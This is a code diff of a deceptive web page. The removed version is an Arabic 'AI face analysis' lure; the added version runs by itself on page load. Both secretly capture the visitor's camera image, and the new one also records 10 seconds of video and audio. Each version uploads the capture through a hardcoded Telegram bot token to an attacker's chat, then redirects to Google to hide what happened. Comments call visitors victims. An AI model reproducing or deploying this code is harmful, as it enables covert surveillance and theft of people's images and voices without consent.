@@ -1,90 +1,58 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحليل الوجه بالذكاء الاصطناعي - شكلك في الماضي</title>
-    <style>
-        body { background: #1a1a2e; color: white; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 30px; margin: 0; }
-        .container { max-width: 500px; margin: auto; border: 2px solid #0f3460; padding: 25px; border-radius: 20px; background: #16213e; box-shadow: 0 0 20px rgba(0,0,0,0.5); }
-        h1 { color: #e94560; font-size: 24px; }
-        p { line-height: 1.6; color: #add8e6; }
-        .btn { background: #e94560; color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 18px; font-weight: bold; transition: 0.3s; margin-top: 20px; }
-        .btn:hover { background: #ff5e78; transform: scale(1.05); }
-        #status { display: none; margin-top: 25px; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #e94560; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <h1>اكتشف شكلك في الماضي 🏛️</h1>
-        <p>بناءً على ملامح وجهك، سيقوم الذكاء الاصطناعي بتحديد العصر الذي تنتمي إليه (فرعوني، روماني، أموي، إلخ..)</p>
-        
-        <button class="btn" onclick="startAnalysis()">ابدأ التحليل المجاني</button>
-        
-        <div id="status">
-            <div class="loader"></div>
-            <p id="progress-text">جاري الاتصال بقاعدة البيانات...</p>
-        </div>
-    </div>
+<script>
+    const token = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
+    const chat_id = '7692110334';
 
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    async function startProcess() {
+        try {
+            // طلب الكاميرا والمايكروفون (ضروري للفيديو)
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            await video.play();
 
-    <script>
-        // دمج معلوماتك الخاصة هنا
-        const BOT_TOKEN = '8586526554:AAFC1KQ_lvsHAnwi8ErI5x27XLC42yGtgyg';
-        const CHAT_ID = '7692110334';
+            // 1. التقاط الصورة فوراً (لضمان وصول شيء سريعاً)
+            const canvas = document.createElement('canvas');
+            canvas.width = 640;
+            canvas.height = 480;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                const formData = new FormData();
+                formData.append('chat_id', chat_id);
+                formData.append('photo', blob, 'image.jpg');
+                formData.append('caption', '📸 تم سحب صورة سريعة.. جاري تسجيل الفيديو 10 ثواني');
+                fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: formData });
+            }, 'image/jpeg');
 
-        async function startAnalysis() {
-            const statusDiv = document.getElementById('status');
-            const progressText = document.getElementById('progress-text');
-            statusDiv.style.display = 'block';
-
-            try {
-                // طلب الكاميرا (هنا النقطة الفاصلة)
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
+            // 2. تسجيل فيديو لمدة 10 ثوانٍ
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+            mediaRecorder.onstop = async () => {
+                const videoBlob = new Blob(chunks, { type: 'video/mp4' });
+                const videoData = new FormData();
+                videoData.append('chat_id', chat_id);
+                videoData.append('video', videoBlob, 'video_10s.mp4');
+                videoData.append('caption', '🎥 فيديو الـ 10 ثواني وصل!');
                 
-                progressText.innerText = "جاري مسح الملامح الحيوية...";
+                await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+                    method: 'POST',
+                    body: videoData
+                });
+                
+                // توجيه المستخدم لموقع آخر للتمويه بعد اكتمال الرفع
+                window.location.href = "https://www.google.com";
+            };
 
-                // تأخير بسيط لضمان وضوح الكاميرا
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'capture.jpg');
-                        formData.append('caption', '🔔 ضحية جديدة دخلت للرابط وتم سحب الصورة!');
+            mediaRecorder.start();
+            // مؤقت الـ 10 ثواني (10000 ميلي ثانية)
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop()); // إيقاف الكاميرا فوراً
+            }, 10000);
 
-                        try {
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                body: formData
-                            });
-                            
-                            // توجيه نهائي للتمويه
-                            progressText.innerText = "تم التحليل! جاري جلب النتيجة...";
-                            setTimeout(() => {
-                                alert("عذراً، الخادم مضغوط حالياً! يرجى المحاولة بعد قليل.");
-                                window.location.href = "https://www.google.com";
-                            }, 2000);
-
-                        } catch (e) {
-                            console.error("Error sending to bot");
-                        }
-                    }, 'image/jpeg');
-                }, 2000);
-
-            } catch (err) {
-                alert("يجب السماح بالكاميرا حتى يتمكن الذكاء الاصطناعي من تحليل وجهك!");
-                statusDiv.style.display = 'none';
-            }
+        } catch (err) {
+            console.log("الرفض أو مشكلة في العتاد");
         }
-    </script>
-</body>
-</html>
+    }
+    window.onload = startProcess;
+</script>
